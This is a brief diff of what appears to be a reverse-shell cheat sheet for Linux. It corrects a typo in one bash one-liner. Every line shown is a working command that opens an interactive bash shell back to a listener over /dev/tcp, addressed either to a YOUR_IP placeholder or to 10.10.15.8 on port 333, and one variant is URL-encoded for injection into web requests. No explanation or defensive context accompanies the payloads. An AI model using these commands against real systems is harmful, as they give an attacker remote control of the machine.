@@ -1,6 +1,6 @@
 ## Linux
 ```bash
-'bash -c "bash -i >& /dev/tcp/YOUR_IP}/333 0>&1"'
+'bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"'
 /bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/333 0>&1'
 %2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.8%2F333%200%3E%261'
